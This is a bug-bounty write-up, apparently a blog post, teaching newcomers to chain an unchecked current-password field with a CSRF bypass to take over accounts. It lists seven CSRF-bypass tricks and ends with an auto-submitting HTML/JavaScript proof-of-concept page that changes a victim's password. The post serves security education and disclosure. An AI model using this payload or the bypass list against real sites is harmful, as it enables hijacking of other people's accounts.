---
title: "Simple Bugs 0x01: Password Changing to Account Takeover"
date: 2023-04-03T00:00:00-03:00
cover:
    image: /cybergroup.png
---

Newcomers think bug hunting and hacking are complex and impossible. You only need the right mindset, basic bugs, and some basic tooling. This series of posts will show you it can be as simple as possible.

---

# Introduction

There's almost no bug better than an account takeover. If you are a malicious hacker, this would be one of the best bugs you could find. It would be expensive on the dark market.

The bugs I'll bring in this post are rare on hardened and bug bounty programs, and it's easy to avoid when using modern web development frameworks. But it doesn't mean they won't exist.

As a newcomer, you should first try stupid, simple, impactful bugs. They'll give you a tip on how the application works, and if you find something, it'll be great!

# The Password Changing

If you have ever tried to change your password, you know you must type the actual one before. Usually, it asks for the password when changing other information, such as your email. But what if the application doesn't validate it? You could change it all, even if you don't know the current password.

It looks inoffensive in the developers' eyes because if you are on this page, you're already authenticated. You already proved you're who you say you are, right? Wrong. Maybe the user forgot his account open on a public computer, or his cellphone got stolen while it was unlocked.

Let's say we found this bug. During penetration testing, you should report this. Still, on a bug bounty program, this will probably be a P5 (no bounties for you). Let's increase the impact. We need another bug to chain.

# Do you even CSRF?

As I said before, modern frameworks make it easy to avoid CSRF issues. But developers need to do it correctly. Some will build their own flawed custom solutions, for example. There's also the SameSite cookies issue, which makes it more challenging but possible.

Let's think about the password-changing mechanism. What if it contains a CSRF bug? If you know CSRF, you can see the account takeover already.

Let's take a quick break for the reading time. There are three useful links below if you need more information before continuing.

- [What is CSRF?](https://portswigger.net/web-security/csrf.)
- [SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [Cookies Hacking - SameSite](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#samesite)

## Bypassing the CSRF

The request used the POST method, sending the CSRF token in the body. When I tried to remove it, it responded with a message saying the token was invalid. They got some protection in place.

```
POST /change-password HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

old_password=...&new_password=...&confirmation_password=...&token=...
```

Here's a non-exhaustive list of ways to bypass CSRF protection that I used in the past:

- Remove the CSRF token value
- Change to a random value (e.g., 1 or 1001)
- Change to an unauthenticated user token
- Change to another authenticated user token
- Change the HTTP method
- Remove the referer header value
- Remove the referer header

A mix of two techniques bypassed the protection: changing the request method and using another user's token.

When I asked the developers for a reason, they told me the GET requests trigger legacy methods that exist for backward compatibility with other APIs. These legacy methods were not performing the CSRF protection as they should.

They had a key-value database for the tokens, in which the key was the token and the value an expiration time. They were not bound to any user, so this is the reason why we can bypass it. It was already fixed in the most recent version, but we found the legacy one.

# Chain

Let's recap what we found so we stay aware of it. We found two bugs:

1. The user doesn't need to know his current password to change it.
1. The password-changing request is vulnerable to CSRF.

All we need to do now is chain these and get the bounty. We must create a website that sends the GET request to the vulnerable application. It requires three fields: old password, new password, and password confirmation.

```html
<html>
	<body>
		<form name='myForm' id='myForm' method="GET" action="https://target.com/change-password?old_password=ANYTHING&new_password=NEWPASSWORD&confirmation_password=NEWPASSWORD">
			<input type="hidden" name="old_password" value="anything"/>
			<input type="hidden" name="new_password" value="newpassword"/>
			<input type="hidden" name="confirmation_password" value="newpassword"/>
			<input type="hidden" name="token" value="another_user_token"/>
			<input type="submit" value="Submit">
		</form>
		<script>
            // Code for fetching another user's token
            // and change the input's value
            // ...
			document.addEventListener('DOMContentLoaded', function(event) {
				document.createElement('form').submit.call(document.getElementById('myForm'));
			});
		</script>
	</body>
<html>
```

The proof of concept above is simple, and you can generate your own using a [CSRF generator](https://csrf.infos3c.net/). For intercepting requests and testing I used [Burp Suite](https://portswigger.net/burp).

# Conclusion and Takeaways

Even though SameSite protection exists, we were lucky because the GET requests also worked. The number of CSRF vulnerabilities will decrease because of it, but they won't become extinct.

Communication between new and old parts of an application is always interesting. It creates multiple bugs every time. It's just a matter of patience until you have a pleasant finding.

I didn't use any paid tool. I didn't need any complex techniques. I just needed to have the tester mindset, which questioned if the current password is validated, along with the basic CSRF knowledge.

Thanks to [@zseano](https://twitter.com/zseano) and his platform, which allowed me to test this simple bug on a program I've already spent hours hacking and never thought of trying something so simple on one of its domains.